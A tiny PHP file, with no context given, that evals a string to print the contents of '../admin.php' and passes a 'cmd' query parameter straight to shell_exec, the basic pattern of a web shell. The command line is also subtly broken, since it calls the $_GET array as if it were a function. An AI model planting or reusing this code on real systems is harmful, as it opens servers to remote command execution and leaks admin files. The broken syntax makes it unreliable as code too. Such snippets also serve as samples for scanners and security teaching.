<?php

$code = "echo file_get_contents('../admin.php');";
eval($code);

shell_exec($_GET("cmd"))
?>
